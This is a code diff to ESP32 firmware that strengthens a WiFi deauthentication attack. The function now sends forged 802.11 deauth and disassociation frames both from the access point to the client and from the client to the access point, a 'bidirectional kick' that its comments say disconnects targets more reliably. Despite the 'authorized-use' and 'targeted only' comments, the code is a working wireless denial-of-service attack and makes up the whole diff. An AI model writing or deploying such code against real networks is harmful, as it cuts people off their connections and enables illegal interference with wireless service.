@@ -26,18 +26,34 @@ void deauth_begin() {
 bool     deauth_active() { return s_on; }
 uint32_t deauth_count()  { return s_count; }
 
-// Authorized-use deauth transmit. Frame is built by the host-tested deauth_frame();
-// esp_wifi_80211_tx pushes raw mgmt frames. Bring-up: needs promiscuous/AP iface
-// active and a target on the current channel — see docs/BRINGUP.md (WiFi deauth).
+static bool mac_is_broadcast(const uint8_t a[6]) {
+  for (int i = 0; i < 6; i++) if (a[i] != 0xFF) return false;
+  return true;
+}
+
+// Authorized-use targeted deauth. Per burst it sends deauth AND disassoc toward
+// the client (AP->client); for a specific (non-broadcast) client it ALSO sends
+// both toward the AP (client->AP) — the bidirectional kick real tools use, which
+// disconnects far more reliably than a single deauth. Frames are built by the
+// host-tested builders; esp_wifi_80211_tx pushes them. Bring-up (needs the radio
+// + a target on-channel). Targeted only — NOT a mass/area jammer.
 bool wifi_deauth_tx(const uint8_t dst[6], const uint8_t bssid[6],
                     uint16_t reason, int bursts) {
   if (!s_on) deauth_begin();                  // promiscuous iface is enough to TX
-  uint8_t frame[DEAUTH_FRAME_LEN];
-  deauth_frame(dst, bssid, reason, frame);
+  uint8_t f[DEAUTH_FRAME_LEN];
   bool ok = true;
+  bool targeted = !mac_is_broadcast(dst);
   for (int i = 0; i < bursts; i++) {
-    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof frame, false) != ESP_OK)
-      ok = false;
+    deauth_frame_ex(dst, bssid, bssid, reason, f);           // AP -> client deauth
+    if (esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof f, false) != ESP_OK) ok = false;
+    disassoc_frame_ex(dst, bssid, bssid, reason, f);         // AP -> client disassoc
+    if (esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof f, false) != ESP_OK) ok = false;
+    if (targeted) {
+      deauth_frame_ex(bssid, dst, bssid, reason, f);         // client -> AP deauth
+      esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof f, false);
+      disassoc_frame_ex(bssid, dst, bssid, reason, f);       // client -> AP disassoc
+      esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof f, false);
+    }
     delay(1);
   }
   return ok;
